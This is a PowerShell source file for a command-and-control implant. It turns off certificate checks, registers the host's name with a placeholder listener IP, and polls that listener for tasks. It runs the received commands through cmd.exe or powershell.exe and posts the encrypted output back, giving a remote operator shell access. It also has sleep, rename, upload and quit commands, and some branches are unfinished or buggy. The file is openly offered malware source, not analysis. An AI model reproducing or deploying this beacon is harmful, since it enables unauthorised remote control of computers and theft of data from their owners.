function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    # Write-Host $key
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function shell($fname, $arg){
    
    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName               = $fname
    $pinfo.RedirectStandardError  = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute        = $false
    $pinfo.Arguments              = $arg
    $p                            = New-Object System.Diagnostics.Process
    $p.StartInfo                  = $pinfo
    
    $p.Start() | Out-Null
    $p.WaitForExit()
    
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()

    $res = "VALID $stdout`n$stderr"
    $res
}

# Bypassign selfsigned certs error
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$ip   = "XXX_listener_ip_placeholder_XXX"
$port = "XXX_listener_port_placeholder_XXX"
## secrets.token_hex(32)
## secrets.token_urlsafe(32)
$key  = "XXX_listener_key_placeholder_XXX"
$n    = 2
$name = ""
$code = ""

$hname = [System.Net.Dns]::GetHostName()
$hname  = Encrypt-String $key $hname
$type  = "powershell"
$type  = Encrypt-String $key $type
$regl  = ("http" + ':' + "//$ip" + ':' + "$port/beacon/register")
$data  = @{
    name = "$hname" 
    type = "$type"
    }
$ret  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
$ret = Decrypt-String $key $ret
$ret = $ret.split()
$flag = $ret[0]
if ($flag -eq "VALID"){
    $name = $ret[1]
    $key = $ret[2]
}
sleep $n

$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")

for (;;){

    $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
    
    ### check response NOT existence
    $taskId = ""
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    # Write-Host $task
    
    if (-Not [string]::IsNullOrEmpty($task)){
        
        $task = Decrypt-String $key $task
        # Write-Host $task
        $task = $task.split()
        $flag = $task[0]
        
        if ($flag -eq "VALID"){
            
            $taskId = $task[1]
            $decoded_command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task[2]))
            $decoded_command = $decoded_command.split()
            $command = $decoded_command[0]
            $args = $decoded_command[1..$decoded_command.Length]

            if ($command -eq "shell"){
            
                $f    = "cmd.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt-String $key $res
                $data = @{result = "$res"}

                $resultfl = ("$resultl" + "$taskId")
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'

            }
            elseif ($command -eq "powershell"){
            
                $f    = "powershell.exe"
                $arg  = "/c "
            
                foreach ($a in $args){ $arg += $a + " " }

                $res  = shell $f $arg
                $res  = Encrypt-String $key $res
                $data = @{result = "$res"}

                $resultfl = ("$resultl" + "$taskId")
                
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'

            }
            elseif ($command -eq "sleep"){

                $n    = [int]$args[0]
                $res = "sleep set to " + "$args[0]" + "sec"
                $res  = Encrypt-String $key
                $data = @{result = "$res"}
                $resultfl = ("$resultl" + "$taskId")
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
            }
            elseif ($command -eq "rename"){
                
                $name    = $args[0]
                $res = "VALID agent renamed to " + "$name"
                $res  = Encrypt-String $key $res
                $data    = @{result = "$res"}
                $resultfl = ("$resultl" + "$taskId")
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
            }
            elseif ($command -eq "upload"){
                # sintax upload filename.zip
                # loop( GET, decrypt, compose ), unzip
                $name    = $args[0]
                $res = "VALID file downloaded to " + "$file_out"
                $res  = Encrypt-String $key $res
                $data    = @{result = "$res"}
                $resultfl = ("$resultl" + "$taskId")
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
            }
            elseif ($command -eq "quit"){
                $res = "VALID agent dead " + "$name"
                $res  = Encrypt-String $key $res
                $data    = @{result = "$res"}

                $resultfl = ("$resultl" + "$taskId")
                Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'

                exit
            }
        }
    }
    sleep $n
}